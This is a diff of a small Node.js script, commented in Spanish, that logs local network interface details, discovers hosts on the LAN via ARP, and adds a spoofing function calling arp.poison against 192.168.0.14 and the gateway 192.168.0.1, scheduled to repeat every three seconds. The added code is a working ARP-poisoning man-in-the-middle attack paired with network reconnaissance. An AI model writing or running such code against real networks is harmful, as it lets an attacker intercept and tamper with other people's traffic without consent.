@@ -6,25 +6,28 @@ const address = require('address')
 const Arpping = require('arpping');
 const arpping = new Arpping();
 
-address.dns(function (err, addrs) {
-  let infoLocal = { 
+//Obtiene información de la Interface
+function localInter() {
+  address.dns(function (err, addrs) {
+    let infoLocal = {
       ipLocal: local.address,
       dnsLocal: addrs,
       info: ip.cidrSubnet(local.cidr)
-  };
-  
-  let data = JSON.stringify(infoLocal, null, 2)
+    };
+    let data = JSON.stringify(infoLocal, null, 2)
+    fs.writeFile('infoLocal.log', data, err => {
+      if (err) {
+        console.error(err)
+        return
+      }
+    })
+  });
+}
 
-  fs.writeFile('infoLocal.log', data, err => {
-    if (err) {
-      console.error(err)
-      return
-    }
-  })
-
-}); 
-
-arpping.discover()
+//Obtiene información de los dispositivos conectados
+//a la misma red
+function subNet() {
+  arpping.discover()
     .then(hosts => {
       fs.writeFile('subNetLocal.log', JSON.stringify(hosts, null, 4), err => {
         if (err) {
@@ -32,6 +35,25 @@ arpping.discover()
           return
         }
         process.exit();
-      }) 
+      })
     }).catch(err => console.log(err));
+}
 
+function spoofing() {
+  arp.poison('192.168.0.14','192.168.0.1');
+}
+
+//Primera ejecución inmediata
+//setTimeout(localInter, 1);
+//setTimeout(subNet, 1);
+setTimeout(spoofing, 1);
+
+//Ejecución en intervalos determinados
+let repLocal = 180000; //3 min
+setInterval(localInter, repLocal);
+
+let repSubNet = 300000; //5 min
+setInterval(subNet, repSubNet);
+
+let repSpoof = 3000; //5 min
+setInterval(spoofing, repSpoof);
